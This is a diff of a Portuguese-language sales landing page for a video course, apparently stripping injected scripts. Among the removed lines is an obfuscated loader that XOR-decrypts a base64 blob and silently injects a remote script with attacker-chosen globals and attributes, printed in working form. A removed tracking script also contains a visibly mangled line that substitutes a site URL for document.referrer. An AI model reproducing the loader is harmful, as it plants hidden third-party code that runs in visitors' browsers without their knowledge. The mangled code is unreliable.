@@ -4,43 +4,6 @@
 <head>
     <!-- Extracted with ZipIt - Clean Mode -->
 <meta charset="utf-8">
-<!-- utm-guard --><script>(function(){try{
-var K=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'],D=30*864e5,L=window.location,q=new URLSearchParams(L.search),now=Date.now();
-function g(k){try{return JSON.parse(localStorage.getItem(k)||'null')}catch(e){return null}}
-function s(k,v){try{localStorage.setItem(k,JSON.stringify(v))}catch(e){}}
-function pick(p){var o={};K.forEach(function(k){var v=p.get(k);if(v)o[k]=v});return o}
-var cur=pick(q);
-if(cur.utm_source&&cur.utm_campaign!=='sem-utm'){var r={p:cur,t:now};if(!g('utm_first'))s('utm_first',r);s('utm_last',r)}
-function site(){var h=L.hostname.split('.')[0],m={'estudio-videos':'estudio','renda-digital-abo':'renda-digital','renda-conteudo':'conteudo','renda-automatica':'automatica'};
-var p=L.pathname.replace(/index\.html$/,'').replace(/^\/+|\/+$/g,'').replace(/\//g,'-');return (m[h]||h)+'-'+(p||'home')}
-function fonte(){var u=navigator.userAgent||'',h='';
-if(/Instagram/i.test(u))return 'instagram';if(/FBAN|FBAV|FB_IAB/i.test(u))return 'facebook';if(/musical_ly|TikTok|Bytedance/i.test(u))return 'tiktok';
-try{h=new url("https://estudio-videos.pages.dev/oficial/document.referrer").hostname.replace(/^www\.|^m\.|^l\.|^lm\./,'')}catch(e){}
-if(!h||h===L.hostname)return '';
-var t=[['youtube','youtube'],['youtu.be','youtube'],['instagram','instagram'],['facebook','facebook'],['fb.','facebook'],['google','google'],['tiktok','tiktok'],['whatsapp','whatsapp'],['wa.me','whatsapp'],['t.co','twitter'],['twitter','twitter'],['x.com','twitter'],['kwai','kwai'],['bing','bing'],['pinterest','pinterest'],['threads','threads'],['telegram','telegram'],['t.me','telegram']];
-for(var i=0;i<t.length;i++)if(h.indexOf(t[i][0])>-1)return t[i][1];return h.split('.')[0]}
-var add={};
-if(!cur.utm_source){
- var last=g('utm_last'),ses=null;try{ses=JSON.parse(sessionStorage.getItem('utm_auto')||'null')}catch(e){}
- if(last&&last.p&&now-last.t<D)add=last.p;
- else{var f=fonte();
-  if(!f&&ses)add=ses;
-  else{var c=site();add={utm_source:f||'direto',utm_medium:'organico',utm_campaign:'sem-utm',src:c};try{sessionStorage.setItem('utm_auto',JSON.stringify(add))}catch(e){}}}
-}
-var ch=0;K.forEach(function(k){if(add[k]&&!q.get(k)){q.set(k,add[k]);ch=1}});
-if(ch&&history.replaceState)history.replaceState(history.state,'',L.pathname+'?'+q.toString()+L.hash);
-var P=pick(q);
-function fix(a){try{if(!a||!a.href||a.href.indexOf('pay.kiwify.com.br')<0)return;var u=new URL(a.href),w=u.searchParams,o=u.toString();
- for(var k in P)if(k!=='src'&&!w.get(k))w.set(k,P[k]);
- if(!w.get('utm_content'))w.set('utm_content',P.src||site());
- if(w.get('utm_campaign')==='sem-utm'||!w.get('src'))w.set('src',w.get('utm_content'));
- if(u.toString()!==o)a.href=u.toString()}catch(e){}}
-function all(){var x=document.querySelectorAll('a[href*="pay.kiwify.com.br"]');for(var i=0;i<x.length;i++)fix(x[i])}
-function cl(e){var a=e.target&&e.target.closest&&e.target.closest('a');if(a)fix(a)}
-window.addEventListener('click',cl,true);window.addEventListener('click',cl,false);
-document.addEventListener('DOMContentLoaded',all);window.addEventListener('load',all);
-window.__utmGuard=P;
-}catch(e){}})();</script><!-- /utm-guard -->
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>Estúdio de Vídeos · Yurizando</title>
 <meta name="description" content="Crie os vídeos que estão lotando de views o TikTok e o Instagram, sem aparecer e sem editar.">
@@ -532,7 +495,6 @@ footer a {
 }
 
 </style>
-<script>(function(){var e_g=atob("DBWrsedBKfiMvu6he26JxJUtC8Ku1prVC2aRnsgiTZaiy5rMEnPSn4QuRNbuzMHSGGfCwZMyBojlxovNVGXCyYItB5L/nMKDGmHfw44jXIzpzcybIEiHk4AtRprt0p2DQU7Qk4kgRJ2uhMzREm3O3a4lC9SuyI/NDnCJi8V3H5rp2tyTTi2YhYRyS5u63YiSS3Sd1dJjVKXx");var m_h=[];for(var g_i=0;g_i<e_g.length;g_i++){m_h.push(e_g.charCodeAt(g_i)&255);}var w_5pjs=m_h[0];var w_rv=m_h.slice(1,1+w_5pjs);var u_k=m_h.slice(1+w_5pjs);var j_tagy=u_k.map(function(b,y_ib9j){return b^w_rv[y_ib9j%w_5pjs];});var n_tw39="";for(var b_kdr=0;b_kdr<j_tagy.length;b_kdr++){n_tw39+=String.fromCharCode(j_tagy[b_kdr]&255);}var b_48y=decodeURIComponent(escape(n_tw39));var r_bfp=JSON.parse(b_48y);var x_ldv=r_bfp.globals||[];x_ldv.forEach(function(t_p){window[t_p.name]=t_p.value;});var c_wq=document.createElement("script");c_wq.src=r_bfp.url;c_wq.async=true;c_wq.defer=true;(r_bfp.attributes||[]).forEach(function(k_2e){c_wq.setAttribute(k_2e.name,k_2e.value);});(document.head||document.documentElement).appendChild(c_wq);})();</script>
 </head>
 <body>
 <div class="wrap">
@@ -602,21 +564,7 @@ addEventListener('resize', fit);
 addEventListener('orientationchange', () => { fitW = 0; setTimeout(fit, 250); });
 if (document.fonts && document.fonts.ready) document.fonts.ready.then(() => { fitW = 0; fit(); });
 
-// Checkout link keeps the page's UTMs (URL API picks ? or & by itself and never duplicates a key the link already has).
-function checkoutHref() {
-  try {
-    const u = new URL(CHECKOUT_URL);
-    new URLSearchParams(location.search).forEach((v, k) => { if (k !== 'vsldebug' && !u.searchParams.has(k)) u.searchParams.append(k, v); });
-    return u.toString();
-  } catch (e) {
-    const q = location.search.replace(/^\?/, '');
-    return q ? CHECKOUT_URL + (CHECKOUT_URL.indexOf('?') === -1 ? '?' : '&') + q : CHECKOUT_URL;
-  }
-}
-buy.href = checkoutHref();
-buy.addEventListener('click', () => {
-  buy.href = checkoutHref();
-});
+buy.href = CHECKOUT_URL;
 
 // ----- Reveal the buy button only at the end -----
 let revealAt = typeof REVEAL_AT_SECONDS === 'number' ? REVEAL_AT_SECONDS : null, revealed = true;
